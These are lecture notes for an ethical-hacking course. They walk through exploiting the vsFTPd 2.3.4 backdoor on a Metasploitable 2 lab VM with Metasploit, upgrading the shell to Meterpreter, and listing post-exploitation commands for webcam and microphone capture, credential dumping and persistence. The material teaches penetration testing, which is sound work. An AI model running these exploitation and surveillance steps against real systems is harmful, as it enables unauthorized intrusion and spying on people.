# Ethical Hacking with Metasploit Framework — Complete Notes

## https://youtu.be/2iLQpCbtrGo

**Course:** Ethical Hacking / Cyber Security
**Type:** Theory + Practical Lab (Zero to First Exploit)

> **Disclaimer:** All techniques demonstrated here are strictly for **educational and defensive purposes** in an isolated lab environment. Performing exploitation on any system without **explicit written authorization** is illegal. Ethical hacking requires a signed contract/permission document from the target organization before any testing begins.

---

## Table of Contents

1. [What Is Ethical Hacking?](#1-what-is-ethical-hacking)
2. [Five Phases of Ethical Hacking](#2-five-phases-of-ethical-hacking)
3. [Lab Setup](#3-lab-setup)
4. [What Is Metasploit Framework?](#4-what-is-metasploit-framework)
5. [Metasploit Architecture — Six Core Components](#5-metasploit-architecture--six-core-components)
6. [MSF Console — Key Commands Reference](#6-msf-console--key-commands-reference)
7. [Practical: Zero to First Exploit (Step-by-Step)](#7-practical-zero-to-first-exploit-step-by-step)
8. [Meterpreter — Post-Exploitation Shell](#8-meterpreter--post-exploitation-shell)
9. [Practical: Upgrading to Meterpreter Session](#9-practical-upgrading-to-meterpreter-session)
10. [Reconnaissance & Scanning — Theory Recap](#10-reconnaissance--scanning--theory-recap)
11. [Career Path, Certifications & Practice Platforms](#11-career-path-certifications--practice-platforms)
12. [Key Takeaways](#12-key-takeaways)

---

## 1. What Is Ethical Hacking?

### 1.1 Hacking vs. Ethical Hacking

| Aspect            | Hacking (Malicious)                                   | Ethical Hacking                                                      |
| ----------------- | ----------------------------------------------------- | -------------------------------------------------------------------- |
| **Definition**    | Compromising a system and gaining unauthorized access | Legally checking systems/networks/websites to find security problems |
| **Authorization** | None — unauthorized                                   | Yes — signed written contract with the target organization           |
| **Intent**        | Cause harm, steal data, disrupt services              | Find vulnerabilities before malicious hackers do, and help fix them  |
| **Legal status**  | Illegal                                               | Legal — bound by a formal contract/scope document                    |

### 1.2 Core Principle

> Ethical hacking performs the **exact same actions** as malicious hacking — but with **written permission from the target organization**. The intent is defensive: to strengthen security, not harm it.

**Key legal requirement:** Before performing any action, an ethical hacker must have a **signed written contract/authorization document** specifying the scope of testing. Without this, any activity — even "just scanning" — can result in criminal charges.

**Why organizations hire ethical hackers:** If a malicious hacker finds a vulnerability before the ethical hacker does, the organization suffers real harm. Proactive testing prevents this.

---

## 2. Five Phases of Ethical Hacking

All ethical hacking follows a structured, sequential process:

| Phase | Name                  | Description                                                                   |
| ----- | --------------------- | ----------------------------------------------------------------------------- |
| **1** | **Reconnaissance**    | Information gathering about the target — passive and active methods           |
| **2** | **Scanning**          | Identifying open ports, services, versions, and vulnerabilities on the target |
| **3** | **Exploitation**      | Using identified vulnerabilities to gain actual access to the system          |
| **4** | **Post-Exploitation** | Maintaining access, escalating privileges, collecting data, lateral movement  |
| **5** | **Reporting**         | Documenting all findings, methods, impact, and remediation recommendations    |

> Today's video focuses on **Phase 3 (Exploitation)** using Metasploit, building on reconnaissance and scanning results from previous sessions.

---

## 3. Lab Setup

### 3.1 Required Virtual Machines

| Machine              | Role                            | OS               |
| -------------------- | ------------------------------- | ---------------- |
| **Attacker VM**      | Performs the attack             | Kali Linux       |
| **Target/Victim VM** | The vulnerable practice machine | Metasploitable 2 |

### 3.2 What Is Metasploitable 2?

**Metasploitable 2** is a deliberately vulnerable Linux virtual machine designed specifically for **practicing penetration testing techniques** in a safe, isolated environment.

- **Intentionally insecure** — many services are left open and vulnerable on purpose.
- **Best for beginners** — provides a realistic target for practicing real-world attack techniques.
- **Safe and isolated** — runs only inside a closed virtual network; never expose it to the internet.
- **Download source:** Officially available as a VM image (download, then import into VirtualBox or VMware exactly the same way as a Kali Linux machine).

### 3.3 Network Configuration

Both VMs should be on the **same isolated virtual network** (Host-Only or NAT Network in VirtualBox/VMware) so they can communicate with each other but are isolated from the real internet.

- Kali Linux = Attacker machine
- Metasploitable 2 = Target/Victim machine

---

## 4. What Is Metasploit Framework?

**Metasploit Framework** is the world's most widely used open-source penetration testing framework.

| Property                      | Details                                                                      |
| ----------------------------- | ---------------------------------------------------------------------------- |
| **Type**                      | Open-source — free to use; community-maintained and continuously improved    |
| **Maintained by**             | Rapid7                                                                       |
| **Originally created by**     | HD Moore, launched in **2003**                                               |
| **Contents**                  | 2,000+ exploits and hundreds of modules — all in one framework               |
| **Interface**                 | CLI-based (MSF Console) and GUI-based (Armitage); this module focuses on CLI |
| **Primary use**               | Penetration testing, CTFs (Capture the Flag), security research              |
| **Associated certifications** | OSCP (Offensive Security Certified Professional), CEH                        |

> **Interview note:** "Who maintains Metasploit Framework?" → **Rapid7**. "Who created it?" → **HD Moore, 2003**. These are common interview questions.

### 4.1 Why Metasploit Is Industry Standard

- **All-in-one platform** — scanning, exploitation, and post-exploitation in a single framework.
- **Point-and-click simplicity** — thousands of ready-to-use exploits without needing to write custom code.
- **Widely trusted** — used in real-world penetration testing and recognized by major certification bodies.
- **Used in:** OSCP (gold standard pentesting cert), CEH, CTF competitions, professional red team engagements.

---

## 5. Metasploit Architecture — Six Core Components

### 5.1 Exploits

**What they are:** Code that takes advantage of a specific vulnerability to gain unauthorized access to a system.

**Real-world analogy:**

- You want to enter a house (the target system).
- Through reconnaissance, you discover the house has a weak door (a vulnerability).
- You use that weak door to get inside (exploitation).
- The **act of attacking through that weakness** = exploitation; the **code used to do it** = an exploit.

**In technical terms:** Code that leverages a specific vulnerability to gain access. The vulnerability was found during reconnaissance and scanning phases.

---

### 5.2 Payloads

**What they are:** Code delivered to the victim system after successful exploitation — provides the attacker with control, persistence, or specific capabilities.

**Real-world analogy (WhatsApp link example):**

- You receive a "Win an iPhone" link on WhatsApp.
- You click it; something downloads to your phone.
- That downloaded item is the **payload** — it was built so that clicking/downloading it gives the attacker access to your device, even though you only "clicked a link."

**Key distinction from exploits:**

- **Exploit** = the method of breaking in (getting through the door).
- **Payload** = what happens once you're inside (what you install/do to maintain control).

**Types of payloads:**
| Payload | Description |
|---|---|
| **Meterpreter** | Advanced in-memory payload; provides an interactive shell with minimal disk traces |
| **Reverse Shell** | Victim machine connects back to attacker's machine, giving attacker shell access |
| **Bind Shell** | Opens a listening port on victim; attacker connects to it |

**Why payloads are needed:** A basic exploit gives initial, often limited access. A payload upgrades that access to full control — root/admin level, persistent presence, camera/mic access, file browsing, etc.

---

### 5.3 Auxiliary Modules

**What they are:** Supporting modules used for **scanning, fuzzing, and reconnaissance** — without performing actual exploitation.

**Uses:**

- Network scanning
- Service enumeration
- Information gathering
- Fuzzing (sending malformed data to find vulnerabilities)

> These are "smaller" tasks in terms of attack impact (no exploitation happening), but they are **critically important** as Phase 1 and Phase 2 of ethical hacking. Without good reconnaissance and scanning, exploitation is impossible.

**Key point:** You can perform reconnaissance AND scanning entirely within Metasploit using auxiliary modules — no need for separate tools (though Nmap is often used alongside).

---

### 5.4 Post Modules

**What they are:** Modules run **after** successful exploitation — used for privilege escalation, data collection, persistence, and lateral movement.

**Uses:**

- Privilege escalation (gaining root/admin from a limited shell)
- Credential dumping
- Collecting sensitive data
- Moving deeper into the network
- Establishing persistent access

---

### 5.5 Encoders

**What they are:** Components that **obfuscate/hide payloads** so that antivirus (AV) software cannot detect them.

**Why needed:** When a payload is sent to a victim machine, the machine's antivirus or Intrusion Detection System (IDS) may detect and block it. Encoders transform the payload into a form that bypasses these defenses.

**Function:** Help bypass AV detection and IDS by encoding the payload so it doesn't match known malware signatures.

---

### 5.6 NOPs (No Operations) and Evasions

**NOPs:**

- Stand for "No Operations" — fill memory space with placeholder bytes.
- Used to ensure payloads are properly aligned in memory.
- Help payloads travel safely without being detected or corrupted.
- More relevant in advanced exploitation (buffer overflow attacks, shellcode alignment).

**Evasions:**

- Help the payload avoid detection by security systems.
- Particularly important in real-world engagements where the target has defensive security tools.
- Less commonly needed in isolated lab environments (Metasploitable 2) but critical in real-world testing.

---

### Summary Table

| Component     | Primary Function                                       | When Used                   |
| ------------- | ------------------------------------------------------ | --------------------------- |
| **Exploits**  | Leverage a vulnerability to gain initial access        | Phase 3 — Exploitation      |
| **Payloads**  | Deliver control/persistence after access               | After exploitation          |
| **Auxiliary** | Scanning, enumeration, reconnaissance                  | Phases 1 & 2                |
| **Post**      | Post-exploitation — escalation, data collection        | Phase 4 — Post-exploitation |
| **Encoders**  | Obfuscate payloads to bypass AV/IDS                    | During payload delivery     |
| **NOPs**      | Memory alignment/padding for reliable exploit delivery | Advanced exploitation       |
| **Evasions**  | Avoid detection by security systems                    | Real-world engagements      |

---

## 6. MSF Console — Key Commands Reference

| Command                                     | Usage                      | Description                                                                                           |
| ------------------------------------------- | -------------------------- | ----------------------------------------------------------------------------------------------------- |
| `msfconsole`                                | Terminal                   | Launches the Metasploit Framework console                                                             |
| `search [keyword]`                          | Inside MSF                 | Search for modules by keyword, CVE, product name, or type                                             |
| `search type:exploit platform:linux [name]` | Inside MSF                 | Narrow search results by platform and type                                                            |
| `use [number or module path]`               | Inside MSF                 | Select and load a specific module                                                                     |
| `show options`                              | Inside MSF                 | Display all configurable options for the currently loaded module (shows required vs. optional fields) |
| `set [OPTION] [value]`                      | Inside MSF                 | Configure a specific option (e.g., `set RHOSTS 10.10.10.10`)                                          |
| `run` or `exploit`                          | Inside MSF                 | Execute the loaded module/exploit                                                                     |
| `sessions`                                  | Inside MSF                 | List all active sessions (background and foreground)                                                  |
| `sessions -i [number]`                      | Inside MSF                 | Interact with (switch into) a specific session                                                        |
| `background` or `Ctrl+Z`                    | Inside active session      | Send current session to background (session remains active)                                           |
| `help`                                      | Inside any context         | Display available commands and options                                                                |
| `ifconfig`                                  | Inside a shell/Meterpreter | Check IP address of the current machine (confirms which machine you're in)                            |
| `whoami`                                    | Inside a shell/Meterpreter | Check current user identity (confirms privilege level)                                                |
| `ls`                                        | Inside a shell/Meterpreter | List files and directories                                                                            |

---

## 7. Practical: Zero to First Exploit (Step-by-Step)

### 7.1 Lab Setup Confirmation

- **Attacker:** Kali Linux VM
- **Target:** Metasploitable 2 VM
- Both on the same isolated virtual network

### 7.2 Step 1 — Discover the Target's IP Address

Run a quick ARP scan to identify devices on the network:

```bash
arp-scan --localnet
```

_(If permission denied, use `sudo arp-scan --localnet`)_

**Result:** The third entry in the output is the Metasploitable 2 target machine's IP (e.g., `10.10.10.x`). Note this IP — it's your **RHOSTS** value.

> The Kali machine is the attacker. Metasploitable 2 is the victim/target. Keep these terms clear.

### 7.3 Step 2 — Review the Nmap Scan Report

The instructor uses a pre-generated Nmap report from a previous session. In this report, the following was identified:

```
TCP Port 21 — FTP service
Product: vsFTPd
Version: 2.3.4
```

> This is a **well-known vulnerability** — vsFTPd 2.3.4 contains a backdoor that allows remote command execution.

**To generate your own Nmap report (from the previous session):**

```bash
nmap -sV -oN report.txt [target_IP]
```

### 7.4 Step 3 — Launch MSF Console

```bash
msfconsole
```

A banner/logo appears when MSF Console starts (the image changes each time — don't be confused if it looks different from the instructor's).

### 7.5 Step 4 — Search for the Exploit

```bash
search vsftpd
```

**Output:** A list of exploits related to vsFTPd appears, each with:

- **Name** (exploit path)
- **Disclosure date**
- **Rank** (Excellent / Good / Normal — indicates reliability)
- **Description**

The target exploit: `exploit/unix/ftp/vsftpd_234_backdoor` — Rank: **Excellent**.

> To narrow searches: `search type:exploit platform:linux vsftpd`

### 7.6 Step 5 — Select the Exploit

```bash
use 0
```

_(or use the full module path: `use exploit/unix/ftp/vsftpd_234_backdoor`)_

Using the number is faster and easier for beginners.

### 7.7 Step 6 — Check Required Options

```bash
show options
```

**Output shows:**
| Option | Required? | Description |
|---|---|---|
| `RHOSTS` | **Yes** | Target host IP address (the victim/Metasploitable machine) |
| `RPORT` | No | Target port (default: 21 for FTP — already pre-set) |
| `CHOST` | No | Connection host |
| `CPORT` | No | Connection port |

Only `RHOSTS` (the target IP) needs to be set manually.

### 7.8 Step 7 — Set the Target IP

Copy the target IP from your ARP scan result, then:

```bash
set RHOSTS [target_IP]
```

_(In the demo: copy with Ctrl+Shift+C, paste with Ctrl+Shift+V in terminal)_

**Confirm it was set correctly:**

```bash
show options
```

The `RHOSTS` field should now show the target IP and its current port (21).

### 7.9 Step 8 — Run the Exploit

```bash
run
```

_(or `exploit`)_

**Successful output:**

```
Command shell session 1 opened ([attacker_IP]:port → [target_IP]:6200)
```

A **command shell session** is now open — you have access to the target machine.

### 7.10 Step 9 — Verify Access

**Check current user:**

```bash
whoami
```

Output: `root` — you have root-level access.

**List files:**

```bash
ls
```

Files on the target machine are now visible.

**Verify you're on the correct machine:**

```bash
ifconfig
```

The IP shown should match the Metasploitable 2 target IP — confirming you are indeed inside the target machine's shell.

### 7.11 Session Backgrounding (Ctrl+Z)

```bash
# Press Ctrl+Z inside the active session
```

This **sends the session to the background** — it remains active and accessible but MSF Console returns to its main prompt. This is normal behavior (sometimes happens automatically).

**Why this matters:** You can now run additional modules (like Meterpreter upgrade) while keeping your original session alive.

**To return to a backgrounded session:**

```bash
sessions           # List all active sessions
sessions -i 1      # Switch into session 1
```

---

## 8. Meterpreter — Post-Exploitation Shell

### 8.1 What Is Meterpreter?

Meterpreter is Metasploit's **advanced in-memory payload** that provides a fully interactive shell with significantly more capabilities than a basic command shell.

| Property                           | Description                                                              |
| ---------------------------------- | ------------------------------------------------------------------------ |
| **Lives in memory**                | Runs entirely in RAM — no files written to disk                          |
| **Minimal disk traces**            | Harder to detect and leaves less forensic evidence                       |
| **Interactive shell**              | Full bidirectional control of the target system                          |
| **More powerful than basic shell** | Access to webcam, microphone, screenshot, file system, network, and more |
| **Best for:**                      | Post-exploitation — after initial access is gained                       |

### 8.2 Why Upgrade from Shell to Meterpreter?

A basic command shell (obtained via the initial exploit) gives **limited access**. Meterpreter provides:

- **Privilege escalation** — escalate to root/system/admin if not already there
- **Persistence** — maintain access even after system restart
- **Credential dumping** — extract saved passwords and hashes
- **Camera/microphone access** — `webcam_list`, `webcam_snap`, `webcam_stream`
- **Screenshot capability**
- **File system navigation** — full read/write access
- **Network commands** — scan from inside the victim's network
- **Audio output recording**

### 8.3 Meterpreter Key Commands (from `help` output)

**Core commands:**

```
background    — Send session to background
exit          — Terminate the Meterpreter session
help          — Show all available commands
```

**System commands:**

```
sysinfo       — Display system info (OS, hostname, etc.)
getuid        — Show current user
ps            — List running processes
shell         — Drop into a standard shell
```

**Privilege escalation:**

```
getsystem     — Attempt to elevate to SYSTEM/root privilege
```

**File system:**

```
ls            — List files
cd [dir]      — Change directory
download [file] — Download a file to attacker machine
upload [file] — Upload a file to victim machine
```

**Webcam commands:**

```
webcam_list   — List available webcams
webcam_snap   — Take a snapshot from webcam
webcam_stream — Start live video stream from webcam
```

**Audio commands:**

```
record_mic    — Record audio from microphone
```

**Network:**

```
ifconfig      — Network interfaces on victim
arp           — ARP table of victim
```

> **Real-world significance:** Everything a legitimate administrator can do on their own machine with admin rights, Meterpreter allows the attacker to do remotely — on the target's machine, without their knowledge.

---

## 9. Practical: Upgrading to Meterpreter Session

### 9.1 Background Context

After the initial exploit (Section 7), a basic command shell session (Session 1) is running in the background. Now we upgrade it to a Meterpreter session for full post-exploitation capability.

### 9.2 Step-by-Step

**Step 1 — Search for Meterpreter post-exploitation module:**

```bash
search type:post name:meterpreter
```

This returns several post-exploitation Meterpreter modules. Select the persistence/upgrade module.

**Step 2 — Load the module:**

```bash
use 2
```

_(or whichever number corresponds to the shell-to-meterpreter upgrade module)_

**Step 3 — Check options:**

```bash
show options
```

Key options to set:
| Option | Description |
|---|---|
| `LHOST` | Local host — **your (attacker's) IP address** — where the Meterpreter connection will connect back to |
| `LPORT` | Local port (default usually fine) |
| `SESSION` | The session number of the existing shell to upgrade |

**Step 4 — Get your attacker IP:**

```bash
ifconfig
```

Note the IP address of your Kali machine's network interface.

**Step 5 — Set LHOST:**

```bash
set LHOST [your_Kali_IP]
```

**Step 6 — Check existing sessions:**

```bash
sessions
```

Note the session number of your existing shell (e.g., Session 1).

**Step 7 — Set SESSION:**

```bash
set SESSION 1
```

**Step 8 — Verify all settings:**

```bash
show options
```

Confirm LHOST and SESSION are both correctly set.

**Step 9 — Run the upgrade:**

```bash
run
```

**Successful output:**

```
Upgrading session ID: 1
Starting exploit
Started reverse TCP handler
Meterpreter session [N] opened
```

**Step 10 — Switch into the Meterpreter session:**

```bash
sessions
sessions -i [meterpreter_session_number]
```

**Step 11 — Confirm Meterpreter access:**

```bash
help       # See all available Meterpreter commands
sysinfo    # System information of target
getuid     # Current user (should show root)
ifconfig   # Verify you're on the correct target machine
```

### 9.3 Handling "Background" Behavior

If the session keeps going to background automatically (`Ctrl+Z` behavior):

- This is normal in MSF Console — don't panic.
- Use `sessions` to list all running sessions.
- Use `sessions -i [number]` to switch into the one you want.
- Multiple sessions can run simultaneously — each is tracked by number.

---

## 10. Reconnaissance & Scanning — Theory Recap

### 10.1 Reconnaissance (Information Gathering)

**Definition:** Collecting as much information as possible about the target system **without directly attacking it**.

**Two types:**

| Type        | Description                                                              | Methods                                           | Risk of Detection                             |
| ----------- | ------------------------------------------------------------------------ | ------------------------------------------------- | --------------------------------------------- |
| **Passive** | Collecting info from public/open sources — no direct contact with target | OSINT, Whois lookup, Google Dorking, Shodan       | Very low — you never touch the target         |
| **Active**  | Directly interacting with the target to gather information               | Nmap port scanning, OS detection, banner grabbing | Higher — target systems may log your activity |

**Active reconnaissance tools:** Nmap, MSF Auxiliary modules
**Passive reconnaissance tools:** Whois, OSINT tools, Google Dorking

### 10.2 Scanning and Service Enumeration

**Purpose:** Identify specific versions of running services to find exploitable vulnerabilities.

**In the practical:**

- Nmap was used to generate a report identifying: `vsFTPd 2.3.4` on port 21.
- This version was mapped to a known backdoor vulnerability.
- That finding directly led to the successful exploit in Section 7.

**Vulnerability mapping:** Once you know the product and version (from scanning), you check whether a known exploit exists. If yes, that is your **entry point**.

### 10.3 The Reconnaissance → Exploitation Flow

```
Passive Recon (OSINT, Whois)
          ↓
Active Recon (Nmap scan)
          ↓
Service Enumeration (product name + version: vsFTPd 2.3.4)
          ↓
Vulnerability Mapping (backdoor exists in this version?)
          ↓
Search in MSF Console (search vsftpd)
          ↓
Select and configure exploit (use, set RHOSTS)
          ↓
Run exploit → Initial shell access
          ↓
Post-exploitation (Meterpreter upgrade, privilege escalation)
          ↓
Report
```

---

## 11. Career Path, Certifications & Practice Platforms

### 11.1 Recommended Learning Path

1. **Complete this lab** — practice MSF Console hands-on, make mistakes, fix them (no "ratta" / rote memorization).
2. **Build things independently** — don't rely on being spoon-fed. Break things, debug, rebuild. This sharpens real skills.
3. **Move to certifications** — only after building practical skills, not before.

> "Collect certifications without practical skills" is explicitly discouraged — the goal is genuine skill, and certifications should **prove** existing ability.

### 11.2 Certifications (Recommended Order)

| Certification                                        | Provider           | Level        | Notes                                                                                                                            |
| ---------------------------------------------------- | ------------------ | ------------ | -------------------------------------------------------------------------------------------------------------------------------- |
| **eJPT** (eLearnSecurity Junior Penetration Tester)  | eLearnSecurity     | Beginner     | Excellent starting point; practical focus                                                                                        |
| **CompTIA PenTest+**                                 | CompTIA            | Intermediate | Well-recognized for job applications; good for resume filtering                                                                  |
| **CEH** (Certified Ethical Hacker)                   | EC-Council         | Intermediate | Industry-recognized; widely seen on job postings                                                                                 |
| **OSCP** (Offensive Security Certified Professional) | Offensive Security | Advanced     | **Gold standard** — most respected penetration testing certification; 100% hands-on exam; preferred by experienced professionals |

> **OSCP note:** Highly respected in the industry. Mainly pursued by professionals with significant experience. Completing it demonstrates real-world practical skill — not just theoretical knowledge.

### 11.3 Career Roles

| Role                   | Type                    | Notes                                         |
| ---------------------- | ----------------------- | --------------------------------------------- |
| **Penetration Tester** | Offensive (Red Team)    | Tests systems by simulating attacks           |
| **Red Team Analyst**   | Offensive               | Simulates full adversary operations           |
| **Security Engineer**  | Mixed                   | Builds and tests security infrastructure      |
| **Bug Bounty Hunter**  | Offensive (Independent) | Finds vulnerabilities in programs for rewards |
| **SOC Analyst**        | Defensive (Blue Team)   | Monitors and responds to security events      |

> **Important note on SOC/Blue Team:** Even for defensive roles (SOC Analyst), understanding how attackers think is essential. A good SOC analyst needs to understand offensive techniques to hunt effectively.

### 11.4 Practice Platforms

| Platform                                   | Cost            | Best For                                      |
| ------------------------------------------ | --------------- | --------------------------------------------- |
| **Your own lab** (Kali + Metasploitable 2) | Free            | Foundational practice, controlled environment |
| **Hack The Box (HTB)**                     | Free + Premium  | Intermediate/Advanced CTF-style machines      |
| **TryHackMe**                              | Free + Low cost | Beginner-friendly, guided paths               |
| **VulnHub**                                | Free            | Downloadable vulnerable VMs                   |
| **PentesterLab**                           | Free + Premium  | Web and network pentesting practice           |

### 11.5 Portfolio Building

**Why portfolio matters:** LinkedIn alone lists **22,000+ unfilled cybersecurity openings** — the gap exists not because jobs aren't available but because candidates lack demonstrable real-world skills and well-built portfolios.

**How to build your portfolio:**

- **GitHub** — upload small security projects, scripts, custom tools.
- **Medium** — write articles: what you learned, how you approached a challenge, what you built. This demonstrates both technical skill and communication ability.
- **Bug bounty write-ups** — document any responsible disclosures.
- **CTF write-ups** — document Hack The Box / TryHackMe solutions.

**Resume/interview prep:** Build interview-ready skills by practicing common questions, including both technical (how does Meterpreter work?) and conceptual (who maintains Metasploit?).

---

## 12. Key Takeaways

1. **Ethical hacking is legal hacking with written permission** — always have a signed contract defining the scope before testing anything. Without it, you're committing a crime regardless of intent.

2. **Exploitation is Phase 3 of a 5-phase process** — it cannot happen without quality reconnaissance (Phase 1) and scanning (Phase 2). A good scan report is what makes a successful exploit possible.

3. **Vulnerability ≠ just a finding — it is an entry point** — when vsFTPd 2.3.4's backdoor was found in the scan report, that single finding became the direct path to root-level access.

4. **Metasploit has six core components** — Exploits (break in), Payloads (what you do once in), Auxiliary (scan/recon), Post (post-exploitation), Encoders (hide from AV), NOPs/Evasions (memory alignment/stealth). Understanding each prevents confusion when using MSF Console.

5. **The basic exploit flow in MSF Console is simple** — `search` → `use` → `show options` → `set RHOSTS` → `run`. These five steps cover the majority of basic exploitation scenarios.

6. **Initial shell ≠ full control** — a basic command shell from exploitation gives limited access. Upgrading to Meterpreter unlocks full post-exploitation capabilities: root access, persistence, credential dumping, webcam/mic access, network commands, and more.

7. **Sessions in MSF Console are manageable** — backgrounded sessions (Ctrl+Z) don't disappear; they continue running. `sessions` lists all active ones; `sessions -i [number]` re-enters any of them. Multiple simultaneous sessions are normal.

8. **Errors during practice are normal and educational** — the instructor herself encountered session management quirks live. The learning comes from debugging and resolving them, not from scripted perfection.

9. **Practical skills must precede certifications** — building genuine hands-on ability (in the lab, through CTFs, through bug bounties) should come before pursuing certifications, which then serve to prove existing skill to employers.

10. **Document everything** — good reporting is as important as the exploitation itself. Every step taken, every finding, and every recommended fix should be documented. This is what distinguishes a professional ethical hacker from someone who "just ran a tool."

---

_These notes cover exploitation using Metasploit as a practical continuation of the reconnaissance and scanning module. They complement the Web Application Security notes (which cover application-layer attacks) and serve as the bridge between passive information gathering and active system compromise._
